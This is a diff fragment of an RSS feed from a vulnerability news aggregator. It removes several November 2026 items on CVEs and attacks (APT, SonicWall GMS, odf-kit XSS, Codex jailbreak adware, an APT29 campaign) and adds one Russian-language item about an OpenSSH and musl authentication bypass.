-The fix for CVE-[phone] (released 2026.06.1) is incomplete. It added a DuckDB sandbox (`SET GLOBAL allowed_directories=[&lt;storage root&gt;]; SET GLOBAL enable_external_access=false`) and an Arc SQL-layer denylist of the **literal** functions `read_parquet(` and `arc_partit</description>
-    </item>
-    <item>
-      <title>Debian and Ubuntu APT Flaw Lets MitM Attackers Swap Verified Packages and Run Code as Root</title>
-      <link>https://cveradar-ah3.pages.dev/item/debian-and-ubuntu-apt-flaw-lets-mitm-attackers-swap-verified-pac.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/debian-and-ubuntu-apt-flaw-lets-mitm-attackers-swap-verified-pac.html</guid>
-      <pubDate>Wed, 04 Nov 2026 17:00:46 GMT</pubDate>
-      <description>A flaw in APT, the package manager for Debian and Ubuntu, allows an attacker who can modify package downloads to swap a checked package for their own. The attacker's code then runs as root, according to advisories that&amp;nbsp;Debian,&amp;nbsp;Ubuntu, and&amp;nbsp;APT's developers&amp;nbsp;published on November 4.</description>
-    </item>
-    <item>
-      <title>CVE-2026-93363: @payloadcms/storage-vercel-blob has access control bypass of uploads in Vercel Storage adapter</title>
-      <link>https://cveradar-ah3.pages.dev/item/cve-2026-93363-payloadcms-storage-vercel-blob-has-access-control.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-93363-payloadcms-storage-vercel-blob-has-access-control.html</guid>
-      <pubDate>Wed, 04 Nov 2026 17:00:39 GMT</pubDate>
-      <description>Severity: medium. ### Impact
-In affected configurations, client upload access does not consistently align with the associated collection’s access configuration.
-
-You are affected if:
-- You use client uploads with `@payloadcms/storage-vercel-blob`.
-- Authenticated users can access the client-upload r</description>
-    </item>
-    <item>
-      <title>SonicWall Won't Patch EoL GMS Flaws That Could Expose Files, Alter Database Records</title>
-      <link>https://cveradar-ah3.pages.dev/item/sonicwall-won-t-patch-eol-gms-flaws-that-could-expose-files-alte.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/sonicwall-won-t-patch-eol-gms-flaws-that-could-expose-files-alte.html</guid>
-      <pubDate>Wed, 04 Nov 2026 17:00:38 GMT</pubDate>
-      <description>SonicWall has warned of two vulnerabilities impacting end-of-life Global Management System (GMS) systems that it said will not be patched. Details of the security flaws, which affect SonicWall GMS 9.5.2 and earlier versions, are below - CVE-[phone] (CVSS score: 9.1) - An unauthenticated file read vu</description>
-    </item>
-    <item>
-      <title>CVE-2026-113787: odf-kit: HTML injection leading to XSS in odtToHtml() and odsToHtml() via unescaped style attribute values</title>
-      <link>https://cveradar-ah3.pages.dev/item/cve-2026-113787-odf-kit-html-injection-leading-to-xss-in-odttoht.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/cve-2026-113787-odf-kit-html-injection-leading-to-xss-in-odttoht.html</guid>
-      <pubDate>Wed, 04 Nov 2026 16:14:34 GMT</pubDate>
-      <description>Severity: medium. ### Summary
-
-ODF style attribute values are interpolated into `style="..."` attributes without HTML-escaping in **both** of odf-kit's to-HTML renderers (`odtToHtml` and `odsToHtml`). A double-quote character inside an attacker-controlled style value breaks out of the attribute, all</description>
-    </item>
-    <item>
-      <title>Researchers Uncover Prompt Adware Hidden in OpenAI Codex Jailbreak Toolkit</title>
-      <link>https://cveradar-ah3.pages.dev/item/researchers-uncover-prompt-adware-hidden-in-openai-codex-jailbre.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/researchers-uncover-prompt-adware-hidden-in-openai-codex-jailbre.html</guid>
-      <pubDate>Wed, 04 Nov 2026 16:06:43 GMT</pubDate>
-      <description>Cybersecurity researchers have disclosed details of an OpenAI Codex jailbreak bundle that's designed to modify an artificial intelligence (AI) agent's trusted instructions to insert advertisements for a third-party AI gateway. The phenomenon has been codenamed prompt adware by Check Point Research. </description>
-    </item>
-    <item>
-      <title>APT29-Linked Hackers Hijack Web Analytics Script to Deliver iOS and Android Exploits</title>
-      <link>https://cveradar-ah3.pages.dev/item/apt29-linked-hackers-hijack-web-analytics-script-to-deliver-ios-.html</link>
-      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/apt29-linked-hackers-hijack-web-analytics-script-to-deliver-ios-.html</guid>
-      <pubDate>Wed, 04 Nov 2026 14:27:52 GMT</pubDate>
-      <description>The Russia-linked threat actor known as APT29 is presumed to be behind a large-scale watering hole campaign targeting iOS and Android users through compromised websites, fake domains, and a supply chain attack involving a Ukrainian web analytics service called Plerdy SEO Tracker. "The injected JavaS</description>
+      <title>Уязвимость в OpenSSH и musl позволяет обойти SSH-аутентификацию в Linux</title>
+      <link>https://cveradar-ah3.pages.dev/item/openssh-musl-ssh-linux.html</link>
+      <guid isPermaLink="true">https://cveradar-ah3.pages.dev/item/openssh-musl-ssh-linux.html</guid>
+      <pubDate>Fri, 06 Nov 2026 08:30:30 GMT</pubDate>
+      <description>Независимый ИБ-исследователь Озгюн Кюльтекин (Özgün Kültekin) обнаружил уязвимость *sshhole, которая возникает при взаимодействии OpenSSH и библиотеки musl libc. При определенной конфигурации Linux-системы баг позволяет войти в учетную запись с отключенной парольной аутентификацией, просто отправив </description>
     </item>
   </channel>
 </rss>
